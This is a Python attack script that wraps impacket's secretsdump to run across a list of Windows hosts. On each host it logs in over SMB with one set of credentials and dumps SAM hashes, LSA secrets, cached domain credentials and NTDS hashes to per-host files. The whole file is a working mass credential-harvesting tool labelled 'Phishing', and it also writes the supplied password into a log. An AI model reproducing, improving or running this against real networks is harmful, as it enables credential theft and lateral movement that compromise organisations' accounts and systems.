#!/usr/bin/python
############################
# Avoid using this on a DC #
############################
from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys
from impacket import version
from impacket.examples import logger
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
try:
    input = raw_input
except NameError:
    pass
from threading import Thread, current_thread, Lock
import threading

class ThreadedDumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', outputFile=None, execMethod='smbexec'):
        self.lock = threading.Lock()
        self.imacket = threading.Thread(target=self.dump)
        #self.imacket.daemon = True
        self.__useVSSMethod = False
        self.__remoteName = remoteName
        self.__remoteHost = remoteName
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = None
        self.__securityHive = None
        self.__samHive = None
        self.__ntdsFile = None
        self.__history = False
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = outputFile
        self.__doKerberos = False
        self.__justDC = False
        self.__justDCNTLM = False
        self.__justUser = None
        self.__pwdLastSet = False
        self.__printUserStatus = False
        self.__resumeFileName = None
        self.__canProcessSAMLSA = True
        self.__kdcHost = None
        self.__execMethod = execMethod
        self.__options = None
    
    def start(self):
        self.imacket.start()

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        with self.lock:
            logger.info('[*]Running secretsdump on %s as %s:%s' % (self.__remoteName, self.__username, self.__password))
            try:
                if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                    self.__isRemote = False
                    self.__useVSSMethod = True
                    if self.__systemHive:
                        localOperations = LocalOperations(self.__systemHive)
                        bootKey = localOperations.getBootKey()
                        if self.__ntdsFile is not None:
                        # Let's grab target's configuration about LM Hashes storage
                            self.__noLMHash = localOperations.checkNoLMHashPolicy()
                    else:
                        import binascii
                        bootKey = binascii.unhexlify(self.__bootkey)

                else:
                    self.__isRemote = True
                    bootKey = None
                    try:
                        try:
                            self.connect()
                        except Exception as e:
                            if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                                # SMBConnection failed. That might be because there was no way to log into the
                                # target system. We just have a last resort. Hope we have tickets cached and that they
                                # will work
                                logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                                pass
                            else:
                                raise

                        self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                        self.__remoteOps.setExecMethod(self.__execMethod)
                        if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                            self.__remoteOps.enableRegistry()
                            bootKey             = self.__remoteOps.getBootKey()
                            # Let's check whether target system stores LM Hashes
                            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                    except Exception as e:
                        self.__canProcessSAMLSA = False
                        if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                            and self.__doKerberos is True:
                            # Giving some hints here when SPN target name validation is set to something different to Off
                            # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                            logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                        else:
                            logging.error('RemoteOperations failed: %s' % str(e))

                # If RemoteOperations succeeded, then we can extract SAM and LSA
                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                    try:
                        if self.__isRemote is True:
                            SAMFileName         = self.__remoteOps.saveSAM()
                        else:
                            SAMFileName         = self.__samHive

                        self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                        self.__SAMHashes.dump()
                        if self.__outputFileName is not None:
                            self.__SAMHashes.export(self.__outputFileName)
                    except Exception as e:
                        logging.error('SAM hashes extraction failed: %s' % str(e))

                    try:
                        if self.__isRemote is True:
                            SECURITYFileName = self.__remoteOps.saveSECURITY()
                        else:
                            SECURITYFileName = self.__securityHive

                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                       isRemote=self.__isRemote, history=self.__history)
                        self.__LSASecrets.dumpCachedHashes()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportCached(self.__outputFileName)
                        self.__LSASecrets.dumpSecrets()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportSecrets(self.__outputFileName)
                    except Exception as e:
                        if logging.getLogger().level == logging.DEBUG:
                            import traceback
                            traceback.print_exc()
                        logging.error('LSA hashes extraction failed: %s' % str(e))

                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                if self.__isRemote is True:
                    if self.__useVSSMethod and self.__remoteOps is not None:
                        NTDSFileName = self.__remoteOps.saveNTDS()
                    else:
                        NTDSFileName = None
                else:
                    NTDSFileName = self.__ntdsFile

                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
                                               printUserStatus= self.__printUserStatus)
                try:
                    self.__NTDSHashes.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                        # We don't store the resume file if this error happened, since this error is related to lack
                        # of enough privileges to access DRSUAPI.
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
                    logging.error(e)
                    if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
                        logging.info("You just got that error because there might be some duplicates of the same name. "
                                     "Try specifying the domain name for the user as well. It is important to specify it "
                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                    elif self.__useVSSMethod is False:
                        logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
                self.cleanup()
            except (Exception, KeyboardInterrupt) as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error(e)
                if self.__NTDSHashes is not None:
                    if isinstance(e, KeyboardInterrupt):
                        while True:
                            answer =  input("Delete resume session file? [y/N] ")
                            if answer.upper() == '':
                                answer = 'N'
                                break
                            elif answer.upper() == 'Y':
                                answer = 'Y'
                                break
                            elif answer.upper() == 'N':
                                answer = 'N'
                                break
                        if answer == 'Y':
                            resumeFile = self.__NTDSHashes.getResumeSessionFile()
                            if resumeFile is not None:
                                os.unlink(resumeFile)
                try:
                    self.cleanup()
                except:
                    pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help = True, description = "Phishing")
    parser.add_argument('-computerlist', action='store', help="list with computer hostnames")
    parser.add_argument('-username', action='store', help="list with computer hostnames")
    parser.add_argument('-password', action='store', help="list with computer hostnames")
    parser.add_argument('-domain', action='store', help="list with computer hostnames")
    #args
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()
    if sys.stdout.encoding is None:
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)
    if not options.computerlist:
        print("need computerlist")
        sys.exit(1)
    try:
        with open(options.computerlist, 'r') as f:
            RemoteNames = f.readlines()
    except Exception as e:
        print('[-]Could not read computerlist')
        print(e)
        sys.exit(1)
    if not options.domain:
        domain = ''
    else:
        domain = options.domain
    if not options.username:
        sys.exit(1)
    else:
        username = options.username
    if not options.password:
        from getpass import getpass
        password = getpass("Password:")
    else:
        password = options.password
    #setup logger
    logging.basicConfig(
        level=logging.INFO,
        filename='log.txt',
        format='%(asctime)s - %(funcName)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    stdout_handler=logging.StreamHandler()
    stdout_handler.setFormatter(logging.Formatter(logging.BASIC_FORMAT))    
    logger = logging.getLogger()
    logging.getLogger().addHandler(stdout_handler)
    #start loop
    for RemoteName in RemoteNames:
        dumper = ThreadedDumpSecrets(RemoteName.strip(), username, password, domain, RemoteName.strip(), 'smbexec')
        try:
            dumper.start()
        except Exception as e:
            logging.error('[-]Could not dump on %s' % RemoteName.strip())
            logging.error(e)